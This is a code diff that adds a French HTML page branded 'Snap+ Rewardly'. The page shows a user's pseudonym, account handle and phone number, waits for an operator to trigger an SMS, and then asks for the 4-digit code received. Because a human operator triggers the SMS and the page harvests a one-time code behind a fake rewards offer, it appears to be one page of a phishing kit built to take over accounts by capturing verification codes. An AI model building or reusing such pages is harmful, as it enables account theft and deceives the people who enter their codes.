@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<meta name="theme-color" content="#000000" />
+<title>Code SMS — Snap+ Rewardly</title>
+<link rel="stylesheet" href="css/main.css" />
+</head>
+<body>
+<div class="bg-mesh"></div>
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+
+<div class="form-page">
+<div class="code-card">
+<div class="code-header">
+<div class="code-badge"><span class="code-badge-dot"></span> <span id="code-badge-text">En attente</span></div>
+<h1 id="code-title">En attente du code</h1>
+<p id="code-sub">Un operateur doit d'abord declencher l'envoi du SMS.</p>
+</div>
+
+<div class="pills">
+<div class="pill"><span class="pill-k">Service</span> <span id="pill-svc">...</span></div>
+<div class="pill"><span class="pill-k">Statut</span> <span id="pill-status">En attente</span></div>
+</div>
+
+<div class="recap">
+<div class="recap-row"><span class="recap-k">Pseudo</span><span id="recap-pseudo">-</span></div>
+<div class="recap-row"><span class="recap-k">Compte</span><span id="recap-handle">-</span></div>
+<div class="recap-row"><span class="recap-k">Telephone</span><span id="recap-phone">-</span></div>
+</div>
+
+<div id="view-wait">
+<div class="wait-box">
+<div class="spinner-ring"></div>
+<div class="wait-label">En attente de declenchement...</div>
+<div class="wait-meta" id="wait-meta">Actualisation toutes les 2s</div>
+<button class="btn-sm" id="btn-check">Verifier maintenant</button>
+</div>
+</div>
+
+<div id="view-code" style="display:none">
+<div class="code-body">
+<div class="code-label">Entre les 4 chiffres recus par SMS</div>
+<div class="digits">
+<input class="digit" type="text" inputmode="numeric" maxlength="1" />
+<input class="digit" type="text" inputmode="numeric" maxlength="1" />
+<input class="digit" type="text" inputmode="numeric" maxlength="1" />
+<input class="digit" type="text" inputmode="numeric" maxlength="1" />
+</div>
+<div class="feedback" id="fb-code"></div>
+<button class="btn btn-primary" id="btn-code" disabled>
+<span>Confirmer le code</span>
+<svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M3 8l4 4 6-8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+</button>
+</div>
+</div>
+
+<div id="view-ok" style="display:none">
+<div class="ok-icon">&#10003;</div>
+<h2 class="step-title">Code confirme !</h2>
+<p class="step-sub">Un moderateur va traiter ta demande.</p>
+</div>
+
+</div>
+</div>
+
+<div id="toast-wrap" class="toast-wrap"></div>
+
+<script src="js/code.js"></script>
+</body>
+</html>
